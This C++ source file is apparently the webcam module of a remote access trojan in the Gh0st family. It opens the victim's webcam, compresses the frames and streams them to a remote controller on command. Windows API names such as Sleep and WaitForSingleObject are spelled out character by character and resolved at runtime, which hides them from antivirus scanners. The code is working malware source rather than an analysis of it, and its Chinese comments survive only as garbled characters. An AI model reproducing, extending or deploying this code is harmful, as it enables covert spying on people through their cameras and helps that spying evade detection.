// VideoManager.cpp: implementation of the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////
#include "../stdafx.h"
#include "../Declare.h"   //��̬���ÿ⺯��
#include "VideoManager.h"
#include "../Myfunction.h"  //�Զ��庯��

extern Myfunction *Gyfunction;
//////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////

CVideoManager::CVideoManager(CClientSocket *pClient) : CManager(pClient)
{
 	m_pVideoCap = NULL;
	m_pVideoCodec = NULL;
 	m_bIsWorking = true;
	m_bIsCompress = true;
	m_nVedioWidth = 0;
	m_nVedioHeight = 0;
	m_fccHandler = 0;
 	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

CVideoManager::~CVideoManager()
{
	char SSzlC21[] = {'I','n','t','e','r','l','o','c','k','e','d','E','x','c','h','a','n','g','e','\0'};
	InterlockedExchangeT pInterlockedExchange=(InterlockedExchangeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC21);
	pInterlockedExchange((LPLONG)&m_bIsWorking, false);
    char BrmAP30[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0'};
    WaitForSingleObjectT pWaitForSingleObject=(WaitForSingleObjectT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	pWaitForSingleObject(m_hWorkThread, INFINITE);
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(m_hWorkThread);
}

void CVideoManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	char SSzlC21[] = {'I','n','t','e','r','l','o','c','k','e','d','E','x','c','h','a','n','g','e','\0'};
	InterlockedExchangeT pInterlockedExchange=(InterlockedExchangeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC21);
	switch (lpBuffer[0])
	{
	case COMMAND_NEXT:
		NotifyDialogIsOpen();
		break;
	case COMMAND_WEBCAM_ENABLECOMPRESS: // Ҫ������ѹ��
		{
			// �����������ʼ��������������ѹ������
			if (m_pVideoCodec)
				pInterlockedExchange((LPLONG)&m_bIsCompress, true);
		}
		break;
	case COMMAND_WEBCAM_DISABLECOMPRESS:
		pInterlockedExchange((LPLONG)&m_bIsCompress, false);
		break;
	case COMMAND_WEBCAM_RESIZE:
		ResetScreen(*((LPDWORD)(lpBuffer + 1)), *((LPDWORD)(lpBuffer + 5)));
		break;
	default:	
		break;
	}	
}

void CVideoManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + sizeof(BITMAPINFO);
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;
	Gyfunction->my_memcpy(lpBuffer + 1, m_pVideoCap->m_lpbmi, sizeof(BITMAPINFO));
	Send(lpBuffer, dwBytesLength);

	delete [] lpBuffer;		
}

void CVideoManager::sendNextScreen()
{
	LPVOID	lpDIB = m_pVideoCap->GetDIB();
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;

	UINT	nBufferLen = nHeadLen + m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage;
	LPBYTE	lpBuffer = new BYTE[nBufferLen];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_DIB;
	lpBuffer[1] = m_bIsCompress;
	Gyfunction->my_memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));

	UINT	nPacketLen = 0;
	if (m_bIsCompress && m_pVideoCodec)
	{
		int	nCompressLen = 0;
		BOOL bRet = m_pVideoCodec->EncodeVideoData((LPBYTE)lpDIB, 
			m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage, lpBuffer + nHeadLen, &nCompressLen, NULL);
		if (!nCompressLen)
		{
			// some thing ...
			return;
		}
		nPacketLen = nCompressLen + nHeadLen;
	}
	else
	{
		Gyfunction->my_memcpy(lpBuffer + nHeadLen, lpDIB, m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage);
		nPacketLen = m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage + nHeadLen;
	}

	Send(lpBuffer, nPacketLen);

	delete [] lpBuffer;
}

void CVideoManager::ResetScreen(int nWidth, int nHeight)
{
	char SSzlC21[] = {'I','n','t','e','r','l','o','c','k','e','d','E','x','c','h','a','n','g','e','\0'};
	InterlockedExchangeT pInterlockedExchange=(InterlockedExchangeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC21);
	pInterlockedExchange((LPLONG)&m_bIsWorking, false);
    char BrmAP30[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0'};
    WaitForSingleObjectT pWaitForSingleObject=(WaitForSingleObjectT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	pWaitForSingleObject(m_hWorkThread, INFINITE);

	// ������Ƶ��С
	m_nVedioWidth = nWidth;
	m_nVedioHeight = nHeight;

	pInterlockedExchange((LPLONG)&m_bIsWorking, true);
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

DWORD WINAPI CVideoManager::WorkThread( LPVOID lparam )
{
	char DYrEN70[] = {'G','e','t','T','i','c','k','C','o','u','n','t','\0'};
	GetTickCountT pGetTickCount=(GetTickCountT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN70);
	static DWORD dwLastScreen = pGetTickCount();

	CVideoManager *pThis = (CVideoManager *)lparam;
	
	if (!pThis->Initialize())
	{
		pThis->Destroy();
		pThis->m_pClient->Disconnect();
		return -1;
	}
	pThis->sendBITMAPINFO();
	// �ȿ��ƶ˶Ի����
	pThis->WaitForDialogOpen();

    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);
	while (pThis->m_bIsWorking)
	{
		// �����ٶ�
 		if ((pGetTickCount() - dwLastScreen) < 150)
 			pSleep(100);
 		dwLastScreen = pGetTickCount();
		pThis->sendNextScreen();
	}
	// �����Ѿ�����ʵ�����������µ���
	pThis->Destroy();

	return 0;
}

bool CVideoManager::Initialize()
{
	bool	bRet = false;
	// ����ʹ����
	if (!CVideoCap::IsWebCam())
		return false;

	m_pVideoCap = new CVideoCap;

	// ָ���˹̶���С
	if (m_nVedioWidth && m_nVedioHeight)
	{
		bRet = m_pVideoCap->Initialize(m_nVedioWidth, m_nVedioHeight);
	}
	else
	{
		// ����H263������֧�ֵ����ִ�С,���ȿ���
		bRet = m_pVideoCap->Initialize(352, 288);
		if (!bRet)
			bRet = m_pVideoCap->Initialize(176, 144);

		// ����ϵͳĬ�ϵ�
		if (!bRet)
			bRet = m_pVideoCap->Initialize();

	}

	// ��Ҫ��ѹ������CVideoCap��ʼ��ʧ��
	if (!bRet)
		return bRet;

	// ���⼸�ֽ������ѡһ��
	DWORD	fccHandlerArray[] = 
	{
		859189837,	// Microsoft H.263 Video Codec
		842225225,	// Intel Indeo(R) Video R3.2
		842289229,	// Microsoft MPEG-4 Video Codec V2
		1684633187	// Cinepak Codec by Radius
	};

	for (int i = 0; i < sizeof(fccHandlerArray) / sizeof(fccHandlerArray[0]); i++)
	{
		m_pVideoCodec = new CVideoCodec;
		if (!m_pVideoCodec->InitCompressor(m_pVideoCap->m_lpbmi, fccHandlerArray[i]))
		{
			delete m_pVideoCodec;
			// ��NULL, ����ʱ�ж��Ƿ�ΪNULL���ж��Ƿ�ѹ��
			m_pVideoCodec = NULL;
		}
		else
		{
			m_fccHandler = fccHandlerArray[i];
			break;
		}
	}
	return bRet;
}

void CVideoManager::Destroy()
{
	if (m_pVideoCap)
	{
		delete m_pVideoCap;
		m_pVideoCap = NULL;
	}
	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}
}
